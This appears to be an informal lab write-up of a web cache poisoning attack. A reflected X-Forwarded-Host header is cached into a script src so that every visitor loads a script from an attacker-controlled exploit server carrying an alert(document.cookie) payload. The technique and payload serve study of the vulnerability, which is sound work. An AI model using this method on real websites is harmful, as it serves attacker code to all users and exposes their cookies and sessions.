1) we noticed that thje header X-Forwarded-Host is reflected into the response
2) we can see that if we use a random value in the get URL like ?test=1 and X-Forwarded-Host then the website stores in the cache the page and the URL is used as key
    differently X-Forwarded-For is not used as key
3) if we do now the same request to domain?test=1 without X-Forwarded-Host we can notice that the previous X-Forwarded-Host is reflected, because is cached. We can exploit this vulnerability.

4) the X-Forwarded-Host is reflected in :
<script type="text/javascript" src="//REFLECTED/resources/js/tracking.js"></script>

5) we can go on our exploit server and create a resource at /resources/js/tracking.js
6) in the header of the exploit server response we put Content-Type: application/javascript; charset=utf-8
7) in the body alert(document.cookie) (it is aolready a js file so we don't need <script> </script>) 

8) we force to save in cache the <script type="text/javascript" src="//EXPLOIT-SERVER/resources/js/tracking.js"></script> performing a request to the domain with X-Forwarded-Host: EXPLOIT-SERVER


9) everyone that access to the domain then will trigger the script because it will charged because of the cache
